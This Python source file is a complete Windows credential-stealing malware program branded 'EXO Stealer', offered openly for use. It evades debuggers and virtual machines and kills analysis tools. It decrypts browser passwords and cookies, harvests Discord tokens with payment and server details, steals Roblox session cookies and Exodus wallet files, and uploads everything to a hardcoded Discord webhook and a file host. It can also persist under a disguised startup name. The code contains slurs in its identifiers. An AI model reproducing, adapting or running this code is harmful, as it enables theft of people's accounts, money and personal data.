import json
import os
import base64
import re
import requests
import shutil
import sqlite3
import psutil
import platform
import subprocess
import ctypes
import win32api
import sys
import threading
import time

from pathlib import Path
from zipfile import ZipFile
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData

kernel32 = ctypes.WinDLL('kernel32') # mitigate Windows built-indebugger
is_debugger_detected = kernel32.IsDebuggerPresent() # first use IsDebuggerPresent API

if is_debugger_detected:
     exit()
else:
    pass

is_debugger_detectedremote = ctypes.c_bool(False)

if is_debugger_detectedremote:
    exit()
else:
    pass

config = {
    '__HOOK__': 'https://discord.com/api/webhooks/1193315839370330216/9zmP0xY_xIw8k9-8SYEB539X4SwHu6JHXqQr8gfKtYsNix-ws2CuK1RGqY1UqhQoAw_C', 
    'errorbox': False, # will show an error box but still run :3
    'startup': False # WILL ONLY WORK IF COMPILED TO AN EXE
}

class AntiDebug:

    def __init__(self):
        self.stop = False
        self.threads = []
        t1 = threading.Thread(target=self.antivm)
        t2 = threading.Thread(target=self.disk)
        t3 = threading.Thread(target=self.autoclose)
        self.threads.extend([t1, t2, t3])

        for t in self.threads:
            t.start()

    def autoclose(self):
        for _ in range(120):
            for p in psutil.process_iter():
                if any(procstr in p.name().lower() for procstr in ['taskmgr','process','processhacker','ksdumper','fiddler','httpdebuggerui','wireshark','httpanalyzerv7','fiddler','decoder','regedit','procexp','dnspy','vboxservice','burpsuit', 'burpsuite', 'debugger','httpproxy', 'mitm' ]):
                    try:
                        p.kill()
                    except psutil.AccessDenied:
                        pass
                    except psutil.NoSuchProcess:
                        pass
                    except:
                        pass
            time.sleep(1)

    def antivm(self):
        for p in psutil.process_iter():
            if any(procstr in p.name().lower() for procstr in ["vmwareservice", "vmwaretray", "virtualmachine", "sandboxie" "windowssandbox","joeboxcontrol","vmwareuser","vmware","virtualbox","hyperv"]):
                self.stop = True
                os._exit(0)

    def disk(self):
        minDiskSizeGB = 45
        if len(sys.argv) > 1: 
            minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx('.')
        diskSizeGB = diskSizeBytes/1024/1024/1024
        if diskSizeGB < minDiskSizeGB:
            try:
                self.stop = True
                os._exit(0)
            except psutil.AccessDenied:
                pass
            except psutil.NoSuchProcess:
                pass
            except:
                pass

# WORKS WITHOUT ADMIN TOO
class Exodus:
    def __init__(self):
        self.amountfiles = 0
        try:
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus")
            self.stealexo(os.path.join(self.path, "exodus.wallet"))
        except Exception as e:
            return 0 # our ass does not care

    def stealexo(self, path):
        exopath = os.path.join(os.getcwd(), "Exodus")
        os.mkdir(exopath)
        P = os.listdir(path)
        for i in P:
            self.amountfiles += 1
            shutil.copy(os.path.join(path, i), os.path.join(exopath, i))
        zip_path = os.path.join(os.getcwd(), "Exodus.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(exopath):
                for file in files:
                    zip_file.write(os.path.join(root, file))
        with open(zip_path, "rb") as file:
            payload = {"file": file}
            response = requests.post("https://api.anonfiles.com/upload", files=payload)
            if response.ok:
                download = json.loads(response.content.decode("utf-8"))["data"]["file"]["url"]["short"]
                requests.post(config['__HOOK__'],json={ "content": '', "embeds": [ { "description": f"```{download}```", "color": 13290186, "author": { "name": "Exodus Log" } } ], "username": "EXO Stealer", "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict", "attachments": [] })

class Cord:

    def __init__(self) -> None:

        self.tokens = []
        self.local = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')

        paths ={
        'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': self.local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': self.local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': self.local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': self.local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': self.local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': self.local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': self.local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': self.local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': self.local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': self.local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome1': self.local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
        'Chrome2': self.local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
        'Chrome3': self.local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
        'Chrome4': self.local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
        'Chrome5': self.local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': self.local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': self.local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': self.local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': self.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': self.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': self.local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name,path in paths.items():
            if not os.path.exists(path):continue
            try:
                if "cord" in path:
                    self.fagify(name, path)
                else:
                    self.nofaggots(path)
            except Exception as e:pass
        self.wsend()

    def nofaggots(self, path):
        try:
            for file in os.listdir(path):
                if file.endswith((".log", ".ldb")):
                    with open(f"{path}\\{file}", errors="ignore") as f:
                        for line in f:
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                                try:
                                    response = requests.get("https://discord.com/api/v9/users/@me", headers={'Authorization': token})
                                    if response.status_code == 200 and token not in self.tokens:
                                        self.tokens.append(token)
                                except:
                                    pass
        except:
            pass

    def fagify(self, name, path):
        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb"):
                with open(f"{path}\\{file}", "r", errors="ignore") as f:
                    for line in f:
                        matches = re.findall(r"dQw4w9WgXcQ:[^\"]*", line)
                        for match in matches:
                            try:
                                key = self.mkey(self.roaming+f'\\{name}\\Local State')
                                token = self.decrypt(base64.b64decode(match.split('dQw4w9WgXcQ:')[1]), key)
                                resp = requests.get("https://discord.com/api/v9/users/@me",headers={'Authorization':token})
                                if resp.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
                            except:
                                pass


    def decrypt(self,buff: bytes, key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        ciphertext = payload[:-16]
        tag = payload[-16:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decvalue = decryptor.update(ciphertext) + decryptor.finalize()
        decvalue = decvalue.decode()
        return decvalue

    def calc_flags(self,flags:int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": { "emoji": "<:staff:968704541946167357>", "shift": 0, "ind": 1 },
            "DISCORD_PARTNER": { "emoji": "<:partner:968704542021652560>", "shift": 1, "ind": 2 },
            "HYPESQUAD_EVENTS": { "emoji": "<:hypersquad_events:968704541774192693>", "shift": 2, "ind": 4 },
            "BUG_HUNTER_LEVEL_1": { "emoji": "<:bug_hunter_1:968704541677723648>", "shift": 3, "ind": 4 },
            "HOUSE_BRAVERY": { "emoji": "<:hypersquad_1:968704541501571133>", "shift": 6, "ind": 64 },
            "HOUSE_BRILLIANCE": { "emoji": "<:hypersquad_2:968704541883261018>", "shift": 7, "ind": 128 },
            "HOUSE_BALANCE": { "emoji": "<:hypersquad_3:968704541874860082>", "shift": 8, "ind": 256 },
            "EARLY_SUPPORTER": { "emoji": "<:early_supporter:968704542126510090>", "shift": 9, "ind": 512 },
            "BUG_HUNTER_LEVEL_2": { "emoji": "<:bug_hunter_2:968704541774217246>", "shift": 14, "ind": 16384 },
            "VERIFIED_BOT_DEVELOPER": { "emoji": "<:verified_dev:968704541702905886>", "shift": 17, "ind": 131072 },
            "ACTIVE_DEVELOPER": { "emoji": "<:Active_Dev:1045024909690163210>", "shift": 22, "ind": 4194304 },
            "CERTIFIED_MODERATOR": { "emoji": "<:certified_moderator:988996447938674699>", "shift": 18, "ind": 262144 },
            "SPAMMER": { "emoji": "⌨", "shift": 20, "ind": 1048704 }
            }
        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

    def mkey(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                jsonfile = json.loads(f.read())
            encrypted_key = base64.b64decode(jsonfile["os_crypt"]["encrypted_key"])[5:]
            master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except:pass

    def wsend(self):

        for token in self.tokens:

            r = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization':token}).json()

            badges = ' '.join([flag[0] for flag in self.calc_flags(r['public_flags'])])
            v = r['username'] + '#' + r['discriminator'] + "(" + r['id'] + ')'
            avatar_url = f"https://cdn.discordapp.com/avatars/{r['id']}/{r['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{r['id']}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{r['id']}/{r['avatar']}.png"
            created = '`Error`'

            phone = r['phone']
            email = r['email']
            fa = r['mfa_enabled']

            if r['premium_type'] == 2:
                nitro = 'Nitro'
            else:
                nitro = 'None'

            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json() 
            card , paypal , others = 'False','False','False'

            if billing:
                for v in billing:

                    if v['type'] == 1:
                        card = "True"
                    if v['type'] == 2:
                        paypal = "True"
                    if v['type'] != 2 or 1:
                        others = 'True'

            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            alist = []
            servers = ''

            if guilds:
                for guild in guilds:

                    admin = True if guild['permissions'] == '4398046511103' else False

                    if admin and guild['approximate_member_count'] >= 100:

                        if guild['owner']:
                            owner = 'True'
                        else:
                            owner = 'False'

                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()

                        try:
                            invite = f"https://discord.gg/{invites[0]['code']}"
                        except:
                            invite = "discord.gg/synthetic"

                        server_name = guild['name']
                        mem = guild['approximate_member_count']
                        g = f'<a:RedCrown:1044992649679093771> - **[{server_name}]({invite})** , members : `{mem}`, owner : `{owner}`'
                        alist.append(g)
                try:
                    servers = '\n'.join(alist)
                except:pass

            json = { "content": f'**{v}**', "embeds": [ { "color": 13290186, "fields": [ { "name": "Token", "value": f"```fix\n{token}\n```" }, { "name": "Personal", "value": f"Email : `{email}`\n\nNumber : `{phone}`\n\n2FA : `{fa}`", "inline": True }, { "name": "Payments", "value": f"Card : `{card}`\n\nPaypal : `{paypal}`\n\nOthers : `{others}`", "inline": True }, { "name": "Public", "value": f"Badges : `{badges if badges != '' else 'False'}`\n\nCreated : {created}\n\nNitro : `{nitro}`", "inline": True }, { "name": "Nuking possibilities:", "value": f"{servers if servers != '' else 'False'}" } ], "thumbnail": { "url": f"{avatar_url}" } } ], "username": "EXO Stealer", "avatar_url": "https://images-ext-1.discordapp.net/external/okk9uE4g__hvO5ooTFM5HmvnJ2Cs-hbl5RsIo4H5q9g/%3Fq%3Dtbn%3AANd9GcQgD5ZVspNy6ixvhHNlXkl96WI6mGrEM5S9iw%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images", "attachments": [] }
            requests.post(config['__HOOK__'],json=json)

class Browsers:

    def __init__(self): 

        os.makedirs('exo',exist_ok=True)

        self.furrypp = []
        self.furrypp2 = []
        self.furrypp4 = []
        self.furrypp5 = []

        appdata = os.getenv('LOCALAPPDATA')

        browsers = {
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }

        profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ] 

        for _, path in browsers.items():
            try:
                mkey = self.monkey(f'{path}\\Local State')
                for profile in profiles:

                    operations = [
                        self.get_login_data,
                        self.get_cookies,
                    ]

                    for runthis in operations:
                        runthis(path, profile,mkey)
                        self.furrypp4.append(f'{path}')
            except Exception as e:pass

        self.filewrite()
        self.cleanup()



    def monkey(self,path:str) -> str:
        path = Path(path)
        with path.open("r", encoding="utf-8") as f:
            local_state = json.load(f)
        no_one_cares_about_this_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        monkey = CryptUnprotectData(no_one_cares_about_this_key, None, None, None, 0)[1]
        return monkey

    def ilovedick(self,buff: bytes, key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        ciphertext = payload[:-16]
        tag = payload[-16:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decvalue = decryptor.update(ciphertext) + decryptor.finalize()
        decvalue = decvalue.decode()
        return decvalue

    def get_login_data(self, path: str, profile: str,mkey:str):
        newl = []
        login_db = f'{path}\\{profile}\\Login Data'
        shutil.copy(login_db, 'cleame')
        conn = sqlite3.connect('cleame')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            dvalue = self.ilovedick(row[2], mkey)
            self.furrypp.append(f'\nURL:{row[0]}\nUsername:{row[1]}\nPassword:{dvalue}\n')

            list = [   
                'https://coinbase.com',
                'https://gmail.com',
                'https://steam.com',
                'https://discord.com/login',
                'https://riotgames.com',
                'https://youtube.com',
                'https://instagram.com',
                'https://tiktok.com',
                'https://epicgames.com',
                'https://spotify.com',
                'https://roblox.com',
                'https://twitch.com',
                'https://minecraft.net',
                'https://paypal.com',
                'https://netflix.com',
                'https://disney.com',
                'https://expressvpn.com',
                'https://telegram.com',
                'https://hbo.com',
                'https://amazon.com'
            ]            
            self.furrypp5 = []
            for v in list:
                if v in row[0]:
                    self.furrypp5.append(f'\nURL:{row[0]}\nUsername:{row[1]}\nPassword:{dvalue}\n')
        conn.close()
        os.remove('cleame')

    def roblox_cookie(self,cookie):
            try:
                r = requests.get('https://www.roblox.com/mobileapi/userinfo',cookies={'.ROBLOSECURITY':cookie}).json()
                robux = r['RobuxBalance']
                id = r['UserID']
                thumbnail = r['ThumbnailUrl']
                isprem = r['IsPremium']
                username = r['UserName']
                ip = requests.get('https://ipinfo.io/json').json()['ip']
                rapk = requests.get(f'https://inventory.roblox.com/v1/users/{id}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100').json()
                rap = sum(v['recentAveragePrice'] for v in rapk['data'])
                requests.post(config['__HOOK__'],json={ "content": '', "embeds": [  { "description": f"[Rolimons](https://www.rolimons.com/player/{id}) | [Roblox](https://www.roblox.com/users/{id}/profile) | [Trade Link](https://www.roblox.com/users/{id}/trade)", "color": 13290186, "fields": [ { "name": "Robux", "value": f"{robux}", "inline": True }, { "name": "Rap", "value": f"{rap}", "inline": True }, { "name": "Premium", "value": f"{isprem}", "inline": True }, { "name": "Username", "value": f"{username}", "inline": True }, { "name": "UserID", "value": f"{id}", "inline": True }, {"name": "HasPremium", "value": "f{hasPremiumacc}", "inline": True}, { "name": "IP", "value": f"{ip}", "inline": True }, { "name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}\n```" } ], "thumbnail": { "url": f"{thumbnail}" } } ], "username": "EXO Stealer", "avatar_url": "https://images-ext-1.discordapp.net/external/okk9uE4g__hvO5ooTFM5HmvnJ2Cs-hbl5RsIo4H5q9g/%3Fq%3Dtbn%3AANd9GcQgD5ZVspNy6ixvhHNlXkl96WI6mGrEM5S9iw%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images", "attachments": [] })
                ispremiumcheck=requests.get('https://premiumfeatures.roblox.com/v1/users/{id}/validate-membership',cookies={'.ROBLOSECURITY':cookie}).json()
                if ispremiumcheck.status_code == 200:
                    data = ispremiumcheck.json()
                    if data["membershipValid"]:
                        hasPremiumacc="True!"
                    else:
                        hasPremiumacc="False!"
                else:
                    return 0
            except:
                pass

    def get_cookies(self, path: str, profile: str,mkey:str):

        cleanme = f'{path}\\{profile}\\Network\\Cookies'
        shutil.copy(cleanme, 'cleanme')
        conn = sqlite3.connect('cleanme')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            delvalue = self.ilovedick(row[2], mkey)

            if '_|WARNING:-DO-NOT-SHARE-THIS.' in delvalue:
                self.roblox_cookie(delvalue)

            self.furrypp2.append(f'\nWebsite: {row[0]}\nName: {row[1]}\nValue: {delvalue}')

        conn.close()
        os.remove('cleanme')

    def filewrite(self):

        credits = f'------------------------- Users pc just got infected with exo. -------------------------------------------\n'
        tag = f'\n------------------------- Made by Scooby X Synthetic -------------------------------------------'

        if self.furrypp:
            with open('exo//logins.txt','w') as f:
                f.write(credits)
                f.write(''.join(str(x) for x in self.furrypp))
                f.write(tag)
        if self.furrypp2:
            with open('exo//cookies.txt','w') as f:
                f.write(credits)
                f.write(f'\n\n'.join(str(x) for x in self.furrypp2))
                f.write(tag)
        with ZipFile("exo.zip", "w") as zip:
            for file in os.listdir("exo"):
                zip.write(f"exo\\{file}", file)


    def cleanup(self):
        with open('exo.zip','rb') as f:
            psite = requests.post('https://api.anonfiles.com/upload',files={'file':f}).json()['data']['file']['url']['full']

        r = requests.get('https://ipinfo.io/json').json()
        ip = r['ip']
        c = r['country']
        time = r['timezone']
        vpn = requests.get(f'https://proxycheck.io/v2/{ip}').json()[ip]["proxy"]

        shutil.rmtree("exo")
        os.remove("exo.zip")

        logins = ''.join(self.furrypp5) if self.furrypp5 != '' else 'None'
        requests.post(config['__HOOK__'],json={ "content": '', "embeds": [ { "description": f"```diff{logins}```", "color": 13290186, "author": { "name": "Important Logins" } } ], "username": "EXO Stealer", "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict", "attachments": [] })

        paths = '\n+'.join(set(self.furrypp4))
        requests.post(config['__HOOK__'],json={ "content": '', "embeds": [ { "color": 13290186, "fields": [ { "name": "Time", "value": f"{time}", "inline": True }, { "name": "Location", "value": f"{c}", "inline": True }, { "name": "VPN", "value": f"{vpn}", "inline": True }, { "name": "Paths Found", "value": f"```diff\n+{paths}```" }, { "name": "Zip File", "value": f"{psite}" } ], "author": { "name": "Looks like someone ran exo !" } } ], "username": "EXO Stealer", "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict", "attachments": [] })


class System:

    def __init__(self):

        self.r = requests.get('https://ipapi.co/json').json()

        self.send()

    def network(self):

        payload = {
            'username': 'EXO Stealer',
            'avatar_url': 'https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict',
            'embeds': [
                {
                    'title': f'IP Info for {self.r["ip"]}',
                    'description': f'**City:** {self.r["city"]}\n**Region:** {self.r["region"]}\n**Country:** {self.r["country_name"]}\n**ISP:** {self.r["org"]}',
                    'color': 13290186
                }
            ]
        }   

        requests.post(config['__HOOK__'],json=payload)

    def sys_info(self):
        for interface, addrs in psutil.net_if_addrs().items():
            if interface == "Wi-Fi":
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        mac = addr.address

        mem = psutil.virtual_memory()

        info = {
        "PC": platform.node(),
        "OS": platform.platform(),
        "RAM": f"{mem.total / 1024**3:.2f} GB",
        "GPU": "",
        "CPU": platform.processor(),
        "HWID": "",
        "IP": self.r["ip"],
        }


        try:
            import wmi
            c = wmi.WMI()
            for gpu in c.Win32_DisplayConfiguration():
                info["GPU"] = gpu.Description.strip()

            current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
            info["HWID"] = current_machine_id
        except:
            pass

        payload = {
            "embeds": [
                {
                    "title": "PC Info",
                    "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict",
                    "description": "EXO Stealer",
                    "color": 0x03,
                    "fields": [
                        {
                            "name": "PC",
                            "value": f"`{info['PC']}`",
                            "inline": True
                        },
                        {
                            "name": "RAM",
                            "value": f"`{info['RAM']}`",
                            "inline": True
                        },
                        {
                            "name": "OS",
                            "value": f"`{info['OS']}`",
                            "inline": True
                        },
                        {
                            "name": "CPU",
                            "value": f"`{info['CPU']}`",
                            "inline": True
                        },
                        {
                            "name": "GPU",
                            "value": f"`{info['GPU']}`",
                            "inline": True
                        },
                        {
                            "name": "HWID",
                            "value": f"`{info['HWID']}`" if info['HWID'] else "Unknown",
                            "inline": True
                        },
                        {
                            "name": "IP",
                            "value": f"`{info['IP']}`",
                            "inline": True
                        }
                    ]
                }
            ]
        }

        headers = {
            "Content-Type": "Application/Json"
        }

        requests.post(config['__HOOK__'], json=payload, headers=headers)

    def send(self):
        self.network()
        self.sys_info()

class Config():

    def __init__(self) -> None:

        if config['errorbox']:
            self.errorbox()

        if config['startup']:
            self.startup()

    def startup(self):
        current_file = os.path.realpath(__file__)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        shutil.copy(current_file, os.path.join(startup_folder, 'winsyshealth.exe'))

    def errorbox(self):
        ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x0003433\nFailed to load memory.', 'Fatal Error', 2)



if __name__ == '__main__':

    da_opps = [
        AntiDebug,
        Config,
        System,
        Browsers,
        Cord,
        Exodus
    ]

    for v in da_opps:
        v()

    payload = {
        "content": '',
            "embeds": [
                {
                "color": 13290186,
                "author": {
                    "name": "Exo has successfully completed"
                },
                "footer": {
                    "text": "https://github.com/Syntheticc/EXO-Stealer"
                },
                "image": {
                    "url": "https://github.com/Syntheticc/EXO-Stealer/raw/main/exo.gif"
                }
                }
            ],
        "username": "EXO Stealer",
        "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict",
        "attachments": []
    }

    requests.post(config['__HOOK__'],json=payload)


    with open(os.path.join(os.path.dirname(__file__), 'READMEIMPORTANT.txt'), 'w') as f:
        f.write('// INFECTED BY EXO - Synthetic //\n'
            'How did your dumbass think this file was real? Either way, you got infected by EXO.\n')
